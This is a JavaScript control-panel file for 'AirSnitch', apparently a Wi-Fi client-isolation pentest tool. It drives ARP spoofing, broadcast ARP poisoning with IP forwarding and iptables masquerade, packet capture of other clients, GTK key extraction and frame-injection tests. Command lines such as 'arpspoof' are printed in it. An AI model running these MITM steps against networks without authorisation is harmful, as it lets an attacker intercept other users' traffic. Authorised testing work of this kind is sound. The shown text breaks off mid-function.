// ── AirSnitch Control Panel ──────────────────────────────────────────────────

const API = '';
let term = null;
let termSocket = null;
let fitAddon = null;

// ── Tab navigation ──────────────────────────────────────────────────────────

document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        if (!btn.dataset.tab) return;  // skip non-tab buttons (e.g. setup wizard)
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById('tab-' + btn.dataset.tab).classList.add('active');

        if (btn.dataset.tab === 'terminal' && !term) initTerminal();
        if (btn.dataset.tab === 'attack') attackTabLoad();
        if (btn.dataset.tab === 'config') loadConfig();
        if (btn.dataset.tab === 'logs') refreshLogs();
        if (btn.dataset.tab === 'recon') reconTabLoad();
        if (btn.dataset.tab === 'capture') captureTabLoad();
    });
});

// ── Toast notifications ─────────────────────────────────────────────────────

function toast(message, type = 'info') {
    const el = document.createElement('div');
    el.className = `toast toast-${type}`;
    el.textContent = message;
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 3000);
}

// ── API helpers ─────────────────────────────────────────────────────────────

async function api(endpoint, method = 'GET', body = null) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) opts.body = JSON.stringify(body);
    try {
        const res = await fetch(API + endpoint, opts);
        const text = await res.text();
        try {
            return JSON.parse(text);
        } catch (e) {
            // Server returned non-JSON (e.g. HTML 500 error page)
            return { error: `Server error (${res.status}): ${text.substring(0, 200)}` };
        }
    } catch (err) {
        toast('API error: ' + err.message, 'error');
        return { error: err.message };
    }
}

// ── Status ──────────────────────────────────────────────────────────────────

async function refreshStatus() {
    const data = await api('/api/status');
    const badge = document.getElementById('nm-status');
    if (data.network_manager === 'active') {
        badge.textContent = 'NM: Active';
        badge.className = 'status-badge status-warning';
    } else {
        badge.textContent = 'NM: Off';
        badge.className = 'status-badge status-running';
    }
}

// ── Wireless interfaces ─────────────────────────────────────────────────────

async function refreshInterfaces() {
    const el = document.getElementById('wireless-interfaces');
    el.innerHTML = '<p class="muted">Scanning...</p>';
    const data = await api('/api/interfaces');
    if (data.error || !data.interfaces || data.interfaces.length === 0) {
        el.innerHTML = '<p class="muted">No wireless interfaces detected. Plug in a USB adapter and refresh.</p>';
        return;
    }
    el.innerHTML = data.interfaces.map(iface =>
        `<div class="interface-item"><span class="if-name">${esc(iface.name)}</span> &mdash; ${esc(iface.details || 'detected')}</div>`
    ).join('');
}

// ── USB devices ─────────────────────────────────────────────────────────────

async function refreshUSB() {
    const el = document.getElementById('usb-devices');
    el.innerHTML = '<p class="muted">Scanning...</p>';
    const data = await api('/api/usb/devices');
    if (data.error || !data.devices || data.devices.length === 0) {
        el.innerHTML = '<p class="muted">No USB devices detected.</p>';
        return;
    }
    el.innerHTML = data.devices.map(d =>
        `<div class="usb-item">${esc(d)}</div>`
    ).join('');
}

// ── rfkill ──────────────────────────────────────────────────────────────────

async function rfkillUnblock() {
    const data = await api('/api/rfkill/unblock');
    if (data.error) {
        toast(data.error, 'error');
    } else {
        toast('Wi-Fi interfaces unblocked', 'success');
        setTimeout(refreshInterfaces, 1000);
    }
}

// ── Interface mode (airmon-ng) ──────────────────────────────────────────────

async function setMode(mode) {
    const iface = document.getElementById('mode-iface').value.trim();
    if (!iface) {
        toast('Enter an interface name', 'error');
        document.getElementById('mode-iface').focus();
        return;
    }
    const el = document.getElementById('mode-output');
    const text = document.getElementById('mode-output-text');
    el.classList.remove('hidden');
    text.textContent = `Setting ${iface} to ${mode} mode...\n`;
    const data = await api('/api/interfaces/mode', 'POST', { iface, mode });
    text.textContent += data.output || data.error || '(no output)';
    setTimeout(refreshInterfaces, 1500);
}

// ── Pentest tools (single NIC) ──────────────────────────────────────────────

function ptIface() {
    return document.getElementById('pt-iface').value.trim();
}

function ptConnectMode() {
    const el = document.getElementById('pt-connect-mode');
    return el ? el.value : 'standard';
}

async function ptConnect() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    const mode = ptConnectMode();
    const modeLabel = mode === 'airsnitch' ? 'AirSnitch modified wpa_supplicant' : 'stock wpa_supplicant';
    toast(`Connecting (${modeLabel} + DHCP)...`, 'info');
    const data = await api('/api/pentest/connect', 'POST', { iface, mode });
    if (data.error) {
        toast('Connect failed: ' + data.error, 'error');
        if (data.steps) ptShowOutput('Connect steps:\n' + data.steps.join('\n'));
        return;
    }
    toast(data.message, data.connected ? 'success' : 'info');
    if (data.steps) ptShowOutput('Connect steps:\n' + data.steps.join('\n'));
    // Auto-fetch network info after connecting
    if (data.connected) setTimeout(ptNetInfo, 1000);
}

async function ptDisconnect() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    // Stop MITM if active (cleanup forwarding/iptables before disconnect)
    if (typeof _mitmGateway !== 'undefined' && _mitmGateway) {
        await api('/api/pentest/mitm-stop', 'POST', { iface, gateway: _mitmGateway });
        _mitmGateway = '';
    }
    const data = await api('/api/pentest/disconnect', 'POST', { iface });
    if (data.error) { toast(data.error, 'error'); return; }
    toast('Disconnected', 'success');
    document.getElementById('pt-netinfo').classList.add('hidden');
    const bypassSection = document.getElementById('pt-bypass-section');
    if (bypassSection) bypassSection.classList.add('hidden');
    const gtkDisplay = document.getElementById('gtk-info-display');
    if (gtkDisplay) gtkDisplay.innerHTML = '';
}

async function ptNetInfo() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    const data = await api('/api/pentest/netinfo', 'POST', { iface });
    if (data.error) { toast(data.error, 'error'); return; }

    document.getElementById('pt-netinfo').classList.remove('hidden');
    document.getElementById('pt-ssid').textContent = data.ssid || '(not connected)';
    document.getElementById('pt-ip').textContent = data.ip || '—';
    document.getElementById('pt-gw').textContent = data.gateway || '—';
    document.getElementById('pt-subnet').textContent = data.subnet || '—';
    // Show which wpa_supplicant is active
    const modeEl = document.getElementById('pt-mode');
    if (modeEl) {
        if (data.wpa_mode === 'airsnitch') {
            modeEl.textContent = 'AirSnitch (modified)';
            modeEl.style.color = '#f0883e';
        } else if (data.wpa_mode === 'standard') {
            modeEl.textContent = 'Standard (stock)';
            modeEl.style.color = '#7ee787';
        } else {
            modeEl.textContent = ptConnectMode() === 'airsnitch' ? 'AirSnitch (selected)' : 'Standard (selected)';
        }
    }

    // Debug: show gateway detection info if gateway missing
    if (!data.gateway && data.gw_debug) {
        console.log('GW debug:', data.gw_debug);
        ptShowOutput('Gateway detection debug:\n' + data.gw_debug.join('\n'));
    }

    if (data.connected) {
        document.getElementById('pt-target-section').classList.remove('hidden');
        document.getElementById('pt-advanced-section').classList.remove('hidden');
        // Show AirSnitch bypass tests only when connected in AirSnitch mode
        const bypassSection = document.getElementById('pt-bypass-section');
        if (bypassSection) {
            if (data.wpa_mode === 'airsnitch') {
                bypassSection.classList.remove('hidden');
            } else {
                bypassSection.classList.add('hidden');
            }
        }
        // Auto-fill gateway as default target if target field is empty
        const targetEl = document.getElementById('pt-target');
        if (!targetEl.value.trim() && data.gateway) {
            targetEl.value = data.gateway;
        }
        // Auto-fill subnet scan input with network CIDR
        const subnetInput = document.getElementById('pt-subnet-input');
        if (subnetInput && data.subnet) {
            const netCIDR = ptDeriveNetworkCIDR(data.subnet);
            if (netCIDR) subnetInput.value = netCIDR;
        }
        toast(`Connected: ${data.ip} on ${data.ssid}`, 'success');
    } else {
        toast('Not connected — join the target network first', 'error');
        const bypassSection = document.getElementById('pt-bypass-section');
        if (bypassSection) bypassSection.classList.add('hidden');
    }
}

async function ptDiscover() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    toast('Running ARP scan...', 'info');
    const data = await api('/api/pentest/discover', 'POST', { iface });
    if (data.error) { toast(data.error, 'error'); return; }

    const tbody = document.getElementById('pt-clients-body');
    document.getElementById('pt-clients').classList.remove('hidden');
    document.getElementById('pt-target-section').classList.remove('hidden');
    document.getElementById('pt-advanced-section').classList.remove('hidden');
    tbody.innerHTML = '';

    if (!data.clients || data.clients.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" class="muted">No clients found</td></tr>';
        return;
    }

    data.clients.forEach(c => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${esc(c.ip)}</td><td><code>${esc(c.mac)}</code></td><td>${esc(c.vendor)}</td>` +
            `<td><button class="btn btn-primary btn-sm" onclick="ptSelectTarget('${esc(c.ip)}')">Select</button></td>`;
        tbody.appendChild(tr);
    });
    toast(`Found ${data.clients.length} client(s)`, 'success');
}

function ptSelectTarget(ip) {
    document.getElementById('pt-target').value = ip;
    document.getElementById('pt-target-section').classList.remove('hidden');
    toast(`Target set: ${ip}`, 'success');
}

function ptShowOutput(text) {
    const el = document.getElementById('pt-output');
    el.classList.remove('hidden');
    document.getElementById('pt-output-text').textContent = text;
}

async function ptPing() {
    const target = document.getElementById('pt-target').value.trim();
    const iface = ptIface();
    if (!target) { toast('Enter a target IP', 'error'); return; }
    if (!iface) { toast('Enter an interface', 'error'); return; }
    ptShowOutput(`$ ping -c 4 -I ${iface} ${target}\n\nRunning...\n`);
    const data = await api('/api/pentest/ping', 'POST', { target, iface });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }
    const verdict = data.reachable ? '✓ REACHABLE — client isolation FAILED' : '✗ Unreachable — isolation may be enforced';
    ptShowOutput(`${data.output}\n\n── Result: ${verdict}`);
}

async function ptArpCheck() {
    const target = document.getElementById('pt-target').value.trim();
    const iface = ptIface();
    if (!target) { toast('Enter a target IP', 'error'); return; }
    if (!iface) { toast('Enter an interface', 'error'); return; }
    ptShowOutput(`$ arping -c 4 -I ${iface} ${target}\n\nRunning...\n`);
    const data = await api('/api/pentest/arping', 'POST', { target, iface });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }
    const verdict = data.reachable ? '✓ ARP reply received — Layer 2 isolation FAILED' : '✗ No ARP reply — Layer 2 isolation may be enforced';
    ptShowOutput(`${data.output}\n\n── Result: ${verdict}`);
}

async function ptPortScan() {
    const target = document.getElementById('pt-target').value.trim();
    if (!target) { toast('Enter a target IP', 'error'); return; }
    ptShowOutput(`$ nmap -sT -T4 --top-ports 100 ${target}\n\nRunning (up to 60s)...\n`);
    const data = await api('/api/pentest/portscan', 'POST', { target });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }
    ptShowOutput(data.output || '(no output)');
}

function ptDeriveNetworkCIDR(cidrInput) {
    // Convert "192.168.1.15/24" → "192.168.1.0/24" (host IP → network address)
    const parts = cidrInput.split('/');
    if (parts.length !== 2) return null;
    const prefix = parseInt(parts[1]);
    if (isNaN(prefix) || prefix < 0 || prefix > 32) return null;
    const octets = parts[0].split('.').map(Number);
    if (octets.length !== 4 || octets.some(o => isNaN(o) || o < 0 || o > 255)) return null;
    const mask = ~((1 << (32 - prefix)) - 1) >>> 0;
    const ipNum = ((octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]) >>> 0;
    const netNum = (ipNum & mask) >>> 0;
    const netAddr = [(netNum >>> 24) & 0xff, (netNum >>> 16) & 0xff, (netNum >>> 8) & 0xff, netNum & 0xff].join('.');
    return netAddr + '/' + prefix;
}

async function ptSubnetScan() {
    // 1. Check user-specified subnet input first
    const inputEl = document.getElementById('pt-subnet-input');
    let cidr = inputEl ? inputEl.value.trim() : '';

    if (cidr) {
        // User typed a value — validate it
        if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d{1,2}$/.test(cidr)) {
            toast('Invalid CIDR format (e.g. 192.168.1.0/24)', 'error');
            return;
        }
        // Normalise to network address
        const normalised = ptDeriveNetworkCIDR(cidr);
        if (!normalised) {
            toast('Invalid subnet — check the IP and prefix', 'error');
            return;
        }
        cidr = normalised;
    } else {
        // 2. Fall back to auto-derive from Network Info
        const subnetEl = document.getElementById('pt-subnet');
        const subnet = subnetEl ? subnetEl.textContent.trim() : '';
        if (!subnet || subnet === '—') {
            toast('Enter a subnet or click "Network Info" first', 'error');
            return;
        }
        cidr = ptDeriveNetworkCIDR(subnet);
        if (!cidr) {
            toast('Could not derive subnet — enter one manually', 'error');
            return;
        }
    }

    const scanType = document.getElementById('pt-subnet-scantype')?.value || 'quick';
    const labels = { discovery: 'Host Discovery (ping sweep)', top100: 'Top 100 Ports per Host', quick: 'Top 20 Open Ports per Host' };
    const timeouts = { discovery: 120, top100: 600, quick: 300 };

    ptShowOutput(`$ nmap subnet scan: ${cidr}\nMode: ${labels[scanType]}\n\nRunning (up to ${timeouts[scanType]}s — this may take a while)...\n`);
    const data = await api('/api/pentest/subnetscan', 'POST', { subnet: cidr, scan_type: scanType });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }
    ptShowOutput(`$ ${data.command || 'nmap'}\n\n${data.output || '(no output)'}`);
}

// ── Advanced pentest tests ──────────────────────────────────────────────────

function ptGetGateway() {
    const gw = document.getElementById('pt-gw');
    return gw ? gw.textContent.trim() : '';
}

async function ptArpSpoof() {
    const target = document.getElementById('pt-target').value.trim();
    const iface = ptIface();
    const gateway = ptGetGateway();
    if (!target) { toast('Select a target IP first', 'error'); return; }
    if (!iface) { toast('Enter an interface', 'error'); return; }
    if (!gateway || gateway === '—') { toast('Click "Network Info" first to detect the gateway', 'error'); return; }

    ptShowOutput(`$ arpspoof -i ${iface} -t ${target} ${gateway}\n\nRunning ARP spoof test (~10s)...\n`);
    const data = await api('/api/pentest/arpspoof', 'POST', { iface, target, gateway });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }

    let verdict;
    if (data.spoofed) {
        verdict = '⚠ ARP SPOOFING SUCCEEDED — client isolation FAILED\nAn attacker can perform Man-in-the-Middle attacks on this network.';
    } else if (!data.have_arpspoof) {
        verdict = 'ℹ arpspoof not installed (apt install dsniff). Gratuitous ARP was sent via arping.\nCheck the ARP table output above to assess impact.';
    } else {
        verdict = '✓ ARP spoofing did not redirect traffic — isolation may be enforced.\nNote: AP-level protections (DHCP snooping, Dynamic ARP Inspection) can block this.';
    }
    ptShowOutput(`${data.output}\n\n── Verdict ──\n${verdict}`);
}

async function ptGwProbe() {
    const iface = ptIface();
    const gateway = ptGetGateway();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    if (!gateway || gateway === '—') { toast('Click "Network Info" first to detect the gateway', 'error'); return; }

    ptShowOutput(`$ nmap -sT -p 22,23,53,80,443,8080,8443,8888 ${gateway}\n\nProbing gateway (~30s)...\n`);
    const data = await api('/api/pentest/gwprobe', 'POST', { iface, gateway });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }

    let summary = '\n── Summary ──\n';
    if (data.open_ports && data.open_ports.length > 0) {
        summary += `⚠ Gateway has ${data.open_ports.length} open management port(s):\n`;
        data.open_ports.forEach(p => { summary += `  → ${p}\n`; });
        summary += 'An attacker could target these services to compromise the router.\n';
    } else {
        summary += '✓ No common management ports open on gateway.\n';
    }
    summary += data.internet ? '⚠ Internet access: YES (attacker can exfiltrate data)\n' : '✓ Internet access: Blocked\n';
    summary += data.dns ? '⚠ DNS resolution: Working (attacker can resolve targets)\n' : '✓ DNS resolution: Blocked\n';

    ptShowOutput(`${data.output}\n${summary}`);
}

async function ptVlanProbe() {
    const iface = ptIface();
    const gateway = ptGetGateway();
    if (!iface) { toast('Enter an interface', 'error'); return; }
    if (!gateway || gateway === '—') { toast('Click "Network Info" first to detect the gateway', 'error'); return; }

    ptShowOutput(`Probing adjacent subnets from ${gateway}...\n\nTesting up to 15 candidate gateways (~20s)...\n`);
    const data = await api('/api/pentest/vlanprobe', 'POST', { iface, gateway });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }

    let verdict = '\n── Verdict ──\n';
    if (data.reachable && data.reachable.length > 0) {
        verdict += `⚠ INTER-VLAN ROUTING DETECTED — ${data.reachable.length} other subnet(s) reachable!\n`;
        verdict += 'An attacker on this SSID can pivot to other VLANs/subnets.\n';
        verdict += 'This is a significant network segmentation failure.\n';
    } else {
        verdict += '✓ No adjacent subnets reachable — VLAN segmentation appears intact.\n';
    }
    ptShowOutput(`${data.output}\n${verdict}`);
}

async function ptDhcpInfo() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    ptShowOutput(`$ nmap --script broadcast-dhcp-discover -e ${iface}\n\nEnumerating DHCP server (~15s)...\n`);
    const data = await api('/api/pentest/dhcpinfo', 'POST', { iface });
    if (data.error) { ptShowOutput('Error: ' + data.error); return; }
    ptShowOutput(data.output || '(no output)');
}

// ── AirSnitch bypass tests (single NIC) ─────────────────────────────────────

async function ptBypassTest(flag, testName) {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    ptShowOutput(`$ airsnitch.py ${iface} ${flag} ${iface} --same-bss --same-id\n\nRunning ${testName}... (may take up to 2 minutes)\n`);
    const data = await api('/api/pentest/bypass', 'POST', { iface, flag });

    if (data.error) {
        ptShowOutput(`Error: ${data.error}`);
        return;
    }

    let verdictIcon;
    if (data.verdict === 'FAIL') verdictIcon = '\u26a0 VULNERABLE';
    else if (data.verdict === 'PASS') verdictIcon = '\u2713 ISOLATED';
    else if (data.verdict === 'ERROR') verdictIcon = '\u2717 ERROR';
    else verdictIcon = '\u2139 INCONCLUSIVE';

    ptShowOutput(
        `${data.output || '(no output)'}\n\n` +
        `${'─'.repeat(50)}\n` +
        `Verdict: ${testName}\n` +
        `${verdictIcon} — ${data.verdict_detail}\n`
    );
}

async function ptBypassRunAll() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    const tests = [
        { flag: '--check-gtk-shared', name: 'GTK Shared Key Check' },
        { flag: '--c2c', name: 'ARP Poisoning (C2C)' },
        { flag: '--c2c-ip', name: 'IP-Layer Bypass' },
        { flag: '--c2c-port-steal', name: 'Port Steal (Downlink)' },
        { flag: '--c2c-broadcast', name: 'Broadcast Reflection' },
        { flag: '--c2c-eth', name: 'Ethernet Layer' },
        { flag: '--c2c-gtk-inject', name: 'GTK Frame Injection' },
        { flag: '--c2m', name: 'Multicast (C2M)' },
    ];

    let results = `AirSnitch Bypass Test Suite\nInterface: ${iface}\n${'='.repeat(50)}\n\n`;
    ptShowOutput(results + 'Starting all bypass tests...\n');

    for (const test of tests) {
        results += `--- ${test.name} (${test.flag}) ---\n`;
        ptShowOutput(results + `Running ${test.name}...\n`);

        const data = await api('/api/pentest/bypass', 'POST', { iface, flag: test.flag });
        if (data.error) {
            results += `ERROR: ${data.error}\n\n`;
        } else {
            const icon = data.verdict === 'FAIL' ? '\u26a0 VULNERABLE' :
                         data.verdict === 'PASS' ? '\u2713 ISOLATED' :
                         data.verdict === 'ERROR' ? '\u2717 ERROR' : '\u2139 INCONCLUSIVE';
            results += `${icon} — ${data.verdict_detail}\n`;
            if (data.output) results += `Output: ${data.output.substring(0, 200)}${data.output.length > 200 ? '...' : ''}\n`;
            results += '\n';
        }
        ptShowOutput(results);
    }

    results += `${'='.repeat(50)}\nAll bypass tests complete.\n`;
    ptShowOutput(results);
}

async function ptGtkInfo() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    const display = document.getElementById('gtk-info-display');
    if (display) display.innerHTML = '<span class="muted">Extracting GTK...</span>';

    const data = await api('/api/pentest/gtk-info', 'POST', { iface });
    if (data.error) {
        if (display) display.innerHTML = `<span style="color:#f85149">Error: ${data.error}</span>`;
        return;
    }

    if (display) {
        display.innerHTML =
            `<div style="margin-top:0.5rem;">` +
            `<div style="font-family:monospace; color:#f0883e; word-break:break-all; font-size:0.85rem; padding:0.4rem; background:#0d1117; border-radius:4px;">${data.gtk}</div>` +
            `<div class="muted" style="margin-top:0.3rem; font-size:0.75rem;">` +
            `Key ID: ${data.key_id} | ${data.gtk_bits}-bit | BSSID: ${data.bssid || 'N/A'} | MAC: ${data.mac || 'N/A'}` +
            `</div>` +
            `<div class="muted" style="margin-top:0.3rem; font-size:0.7rem; font-style:italic;">${data.note}</div>` +
            `</div>`;
    }
}

// Track gateway for MITM stop/cleanup
let _mitmGateway = '';
let _detectedGateway = localStorage.getItem('airsnitch_gateway') || '';  // persists across reloads
let _lastGtkHex = '';       // GTK from last VULNERABLE result — used for frame injection

async function ptArpPoison() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    ptShowOutput('Detecting gateway...\n');
    const info = await api('/api/pentest/netinfo', 'POST', { iface });
    if (!info.gateway) {
        ptShowOutput('Error: Could not detect gateway IP. Run Network Info first.');
        return;
    }
    _mitmGateway = info.gateway;

    ptShowOutput(
        `MITM Attack Setup\n` +
        `${'='.repeat(50)}\n` +
        `Interface: ${iface}\n` +
        `Gateway:   ${info.gateway}\n` +
        `Our IP:    ${info.ip}\n\n` +
        `Step 1: Enabling IP forwarding (sysctl)\n` +
        `Step 2: Adding iptables MASQUERADE\n` +
        `Step 3: Sending 10 broadcast gratuitous ARP replies\n` +
        `        "${info.gateway} is-at [our MAC]"\n\n` +
        `Running...\n`
    );

    const data = await api('/api/pentest/arp-poison-broadcast', 'POST', {
        iface, gateway: info.gateway, count: 10
    });

    if (data.error) {
        ptShowOutput(`Error: ${data.error}`);
        return;
    }

    let setupInfo = '';
    if (data.setup && data.setup.length) {
        setupInfo = `Setup:\n${data.setup.map(s => `  + ${s}`).join('\n')}\n\n`;
    }

    ptShowOutput(
        `${setupInfo}` +
        `Scapy output:\n${data.output || '(no output)'}\n\n` +
        `${'─'.repeat(50)}\n` +
        `${data.description}\n`
    );
}

async function ptMitmVerify() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    ptShowOutput(
        `MITM Verification\n` +
        `${'='.repeat(50)}\n` +
        `Capturing packets on ${iface} for 10 seconds...\n` +
        `Looking for traffic from other clients (not our IP).\n\n` +
        `Please wait...\n`
    );

    const data = await api('/api/pentest/mitm-verify', 'POST', { iface });
    if (data.error) {
        ptShowOutput(`Error: ${data.error}`);
        return;
    }

    let hostsInfo = '';
    if (data.source_ips && data.source_ips.length) {
        hostsInfo = `\nIntercepted hosts:\n${data.source_ips.map(ip => `  > ${ip}`).join('\n')}\n`;
    }

    ptShowOutput(
        `tcpdump output:\n${data.output || '(no output)'}\n\n` +
        `${'─'.repeat(50)}\n` +
        `Verdict: ${data.verdict}\n` +
        `${data.detail}\n` +
        `Packets captured: ${data.intercepted_packets}\n` +
        `Unique hosts: ${data.unique_hosts}\n` +
        `Our IP: ${data.our_ip}` +
        `${hostsInfo}\n`
    );
}

async function ptMitmStop() {
    const iface = ptIface();
    if (!iface) { toast('Enter an interface', 'error'); return; }

    ptShowOutput(
        `Stopping MITM Attack\n` +
        `${'='.repeat(50)}\n` +
        `Cleaning up...\n`
    );

    const data = await api('/api/pentest/mitm-stop', 'POST', {
        iface, gateway: _mitmGateway
    });

    if (data.error) {
        ptShowOutput(`Error: ${data.error}`);
        return;
    }

    let cleanupInfo = '';
    if (data.cleanup && data.cleanup.length) {
        cleanupInfo = data.cleanup.map(s => `  + ${s}`).join('\n');
    }

    ptShowOutput(
        `${data.message}\n\n` +
        `Cleanup steps:\n${cleanupInfo}\n\n` +
        `${'─'.repeat(50)}\n` +
        `MITM attack stopped. Network traffic restored.\n`
    );

    _mitmGateway = '';
}

// ── Collapsible sections ────────────────────────────────────────────────────

function toggleSection(id) {
    const el = document.getElementById(id);
    const arrow = el.previousElementSibling?.querySelector('.collapse-arrow') ||
                  document.getElementById(id.replace('-advanced', '-arrow').replace('-section', '-arrow'));
    el.classList.toggle('hidden');
    if (arrow) arrow.textContent = el.classList.contains('hidden') ? '▶' : '▼';
}

// ── AirSnitch commands ──────────────────────────────────────────────────────

async function runAirsnitch(flag) {
    const iface1 = document.getElementById('iface1').value.trim();
    const iface2 = document.getElementById('iface2').value.trim();
    const extraSelect = document.getElementById('extra-flags');
    const extra = Array.from(extraSelect.selectedOptions).map(o => o.value).join(' ');

    if (!iface1) {
        toast('Enter a primary interface name (e.g. wlan0)', 'error');
        document.getElementById('iface1').focus();
        return;
    }

    const outputDiv = document.getElementById('airsnitch-output');
    const outputText = document.getElementById('airsnitch-output-text');
    outputDiv.classList.remove('hidden');

    let cmdPreview = `airsnitch.py ${iface1} ${flag}`;
    if (iface2) cmdPreview += ` ${iface2}`;
    if (extra) cmdPreview += ` ${extra}`;
    outputText.textContent = `$ ${cmdPreview}\n\nRunning...\n`;

    const data = await api('/api/airsnitch/run', 'POST', { flag, iface1, iface2, extra });
    if (data.error) {
        outputText.textContent += `\nError: ${data.error}`;
    } else {
        outputText.textContent += data.output || '(no output)';
    }
}

// ── Attack Tab ───────────────────────────────────────────────────────────────

let _attackRunning = false;

async function attackTabLoad() {
    // Load current SSID + config status
    const cfg = await api('/api/config/check');
    const ssidEl = document.getElementById('attack-target-ssid');
    const statusEl = document.getElementById('attack-config-status');
    if (cfg && !cfg.error && cfg.ssid) {
        if (ssidEl) ssidEl.textContent = cfg.ssid;
        if (statusEl) {
            statusEl.textContent = cfg.configured ? '✓ Configured' : '⚠ Check PSK';
            statusEl.className = cfg.configured ? 'attack-config-ok' : 'attack-config-warn';
        }
    } else {
        if (ssidEl) ssidEl.textContent = 'Not configured';
        if (statusEl) {
            statusEl.textContent = '⚠ Use Setup Wizard';
            statusEl.className = 'attack-config-warn';
        }
    }
    // Auto-detect interface
    attackDetectIface(/* silent= */ true);
    // Pre-fill gateway from localStorage cache if we have a prior value
    if (_detectedGateway) {
        const gwField = document.getElementById('exploit-gateway');
        if (gwField && !gwField.value) gwField.value = _detectedGateway;
    }
}

async function attackDetectIface(silent) {
    const data = await api('/api/interfaces');
    const ifaceEl = document.getElementById('attack-iface');
    if (!ifaceEl) return;
    if (data.interfaces && data.interfaces.length > 0) {
        const base = data.interfaces.find(i => !i.name.endsWith('mon')) || data.interfaces[0];
        // Always use the managed-mode name (strip 'mon' suffix if only monitor exists)
        const baseName = base.name.endsWith('mon') ? base.name.slice(0, -3) : base.name;
        ifaceEl.value = baseName;
        if (!silent) toast(`Interface: ${baseName}`, 'success');
    } else {
        if (!silent) toast('No wireless interface found — plug in adapter', 'error');
    }
}

function _showGtkResult(data) {
    const verdictEl    = document.getElementById('attack-verdict');
    const gtkDisplayEl = document.getElementById('attack-gtk-display');
    const outputEl     = document.getElementById('attack-output-text');
    const resultsEl    = document.getElementById('attack-results');
    if (!verdictEl) return;
    resultsEl.classList.remove('hidden');

    const verdictMap = {
        VULNERABLE:     { cls: 'verdict-vulnerable',   icon: '&#9888;', label: 'VULNERABLE' },
        NOT_VULNERABLE: { cls: 'verdict-safe',         icon: '&#10003;', label: 'NOT VULNERABLE' },
        ERROR:          { cls: 'verdict-error',        icon: '&#10007;', label: 'ERROR' },
        INCONCLUSIVE:   { cls: 'verdict-inconclusive', icon: '&#8505;',  label: 'INCONCLUSIVE' },
    };
    const v = verdictMap[data.verdict] || verdictMap.INCONCLUSIVE;
    verdictEl.innerHTML =
        `<div class="verdict-banner ${v.cls}">` +
        `<div class="verdict-title">${v.icon}&nbsp; ${v.label}</div>` +
        `<div class="verdict-detail">${esc(data.verdict_detail)}</div>` +
        '</div>';

    if (data.victim_gtk || data.attacker_gtk) {
        gtkDisplayEl.classList.remove('hidden');
        const match = data.victim_gtk && data.attacker_gtk &&
                      data.victim_gtk === data.attacker_gtk;
        const matchLabel = match
            ? '<span class="gtk-match">SAME &#8212; VULNERABLE</span>'
            : '<span class="gtk-differ">DIFFERENT &#8212; NOT VULNERABLE</span>';
        gtkDisplayEl.innerHTML =
            '<div class="gtk-comparison">' +
            '<div class="gtk-row">' +
            '<span class="gtk-label">Victim GTK</span>' +
            `<span class="gtk-value">${esc(data.victim_gtk || '(not captured)')}</span>` +
            '</div>' +
            '<div class="gtk-row">' +
            '<span class="gtk-label">Attacker GTK</span>' +
            `<span class="gtk-value">${esc(data.attacker_gtk || '(not captured)')}</span>` +
            '</div>' +
            '<div class="gtk-row" style="border-top:1px solid #30363d; padding-top:0.5rem; margin-top:0.25rem;">' +
            '<span class="gtk-label">Verdict</span>' +
            `<span>${matchLabel}</span>` +
            '</div>' +
            '</div>';
    } else {
        gtkDisplayEl.classList.add('hidden');
    }

    if (outputEl) outputEl.textContent = data.output || '(no output)';

    // Cache GTK for frame injection
    if (data.victim_gtk) _lastGtkHex = data.victim_gtk;

    // Use gateway detected server-side; save to localStorage for persistence across reloads
    if (data.detected_gateway) {
        _detectedGateway = data.detected_gateway;
        localStorage.setItem('airsnitch_gateway', _detectedGateway);
    }

    // Show exploit prompt if VULNERABLE, hide otherwise
    const exploitEl = document.getElementById('attack-exploit-prompt');
    const mitmEl    = document.getElementById('attack-mitm-status');
    if (exploitEl) {
        exploitEl.classList.toggle('hidden', data.verdict !== 'VULNERABLE');
        if (data.verdict === 'VULNERABLE') {
            const gwField = document.getElementById('exploit-gateway');
            if (gwField && !gwField.value && _detectedGateway) gwField.value = _detectedGateway;
        }
    }
    if (mitmEl)    mitmEl.classList.add('hidden');

    // Show GTK inject section if VULNERABLE; pre-fill BSSID from output if possible
    const injectEl = document.getElementById('attack-gtk-inject');
    if (injectEl) {
        injectEl.classList.toggle('hidden', data.verdict !== 'VULNERABLE');
        if (data.verdict === 'VULNERABLE' && data.output) {
            // Try to parse BSSID from airsnitch output (e.g. "BSSID: 98:ed:7e:45:04:72")
            const m = data.output.match(/BSSID[:\s]+([0-9a-fA-F:]{17})/);
            const bssidField = document.getElementById('inject-bssid');
            if (m && bssidField && !bssidField.value) bssidField.value = m[1];
        }
    }
}

// ── MITM Exploit Flow ────────────────────────────────────────────────────────

async function exploitAutoDetectGateway() {
    const iface = document.getElementById('attack-iface').value.trim();
    const gwEl  = document.getElementById('exploit-gateway');
    if (gwEl) gwEl.value = '';
    toast('Detecting gateway…', 'info');
